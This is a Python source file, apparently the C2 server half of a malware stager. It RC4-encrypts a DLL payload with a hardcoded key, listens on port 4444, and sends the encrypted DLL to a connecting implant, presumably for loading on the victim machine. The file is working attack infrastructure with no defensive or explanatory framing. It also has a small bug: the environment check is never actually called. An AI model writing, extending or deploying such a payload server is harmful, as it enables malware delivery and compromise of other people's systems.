# server.py

import socket
import struct
import os
import argparse

HOST = "0.0.0.0"
PORT = 4444
DLL_PATH = "payload.dll"

parser = argparse.ArgumentParser()
parser.add_argument('--ip', help='C2 IPv4 address', type=str, default=HOST)
parser.add_argument('-p', '--port', help='C2 port', type=int, default=PORT)
parser.add_argument('--payload', help='File path of the DLL payload', type=str, default=DLL_PATH)

args = parser.parse_args()

def rc4(key: bytes, data: bytes) -> bytes:
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]

    i = 0
    j = 0
    out_data = bytearray(data)
    for n in range(len(out_data)):
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out_data[n] ^= S[(S[i] + S[j]) % 256]

    return bytes(out_data)

def verify_environment() -> bool:
    if not args.ip:
        print('[-] C2 ip is null or empty.')
        return False

    if not args.port:
        print('[-] C2 port is null or empty.')
        return False

    if not args.payload or not os.path.exists(args.payload):
        print('[-] Payload file not found: ' + args.payload)
        return False

    return True

def main():

    if not verify_environment:
        print('[-] Environment error. Server is terminated.')
        return

    with open(args.payload, "rb") as f:
        dll_bytes = f.read()

    dll_bytes = rc4(b'RC4', dll_bytes)

    dll_len = len(dll_bytes)
    print(f"[*] Loaded payload.dll: {dll_len} bytes")

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as srv:
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((args.ip, args.port))
        srv.listen(1)
        print(f"[*] Listening on {HOST}:{PORT}...")

        conn, addr = srv.accept()
        print(f"[+] Connection from {addr}")
        with conn:
            conn.sendall(struct.pack("<I", dll_len))
            conn.sendall(dll_bytes)
            print(f"[+] Sent {dll_len} bytes")

if __name__ == "__main__":
    main()